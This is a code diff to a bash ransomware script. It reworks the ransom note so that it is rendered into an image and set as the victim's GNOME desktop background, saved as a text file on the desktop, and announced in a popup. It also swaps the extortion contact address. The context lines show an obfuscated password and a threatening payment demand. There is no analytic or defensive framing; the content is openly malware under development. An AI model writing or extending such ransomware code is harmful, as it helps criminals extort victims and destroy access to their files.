@@ -15,7 +15,7 @@ PASSWORD=$(echo -n "g0tr00t3d" | base64 | tr 'A-Za-z0-9+/=' 'NOPQRSTUVWXYZabcdef
 done
 
 # Create a convincing ransom note with the unique ID
-cat <<EOF > "$HOME/Desktop/RANSOM_NOTE.txt"
+RANSOM_NOTE=$(cat <<EOF
 ======================================================
 YOUR FILES HAVE BEEN ENCRYPTED
 ======================================================
@@ -31,11 +31,19 @@ Include your unique ID in the transaction message to ensure we can identify your
 
 Failure to pay will result in the permanent loss of your data. We guarantee that payment will result in the decryption of your files.
 
-For any questions, contact us at pradagangmafia@proton.me with your unique ID.
+For any questions, contact us at support@evilusb.com with your unique ID.
 
 Thank you for your cooperation.
 ======================================================
 EOF
+)
+
+# Change the user's background image to the ransom note
+echo "$RANSOM_NOTE" | convert -background white -fill black -font Arial -pointsize 24 label: - | convert - -resize 1920x1080 /tmp/ransom_background.png
+gsettings set org.gnome.desktop.background picture-uri file:///tmp/ransom_background.png
+
+# Create a ransom note file on the desktop
+echo "$RANSOM_NOTE" > "$HOME/Desktop/RANSOM_NOTE.txt"
 
 # Optional: Display a message box
 zenity --info --text="Your files have been encrypted. Check your desktop for instructions." --width=300 --height=150
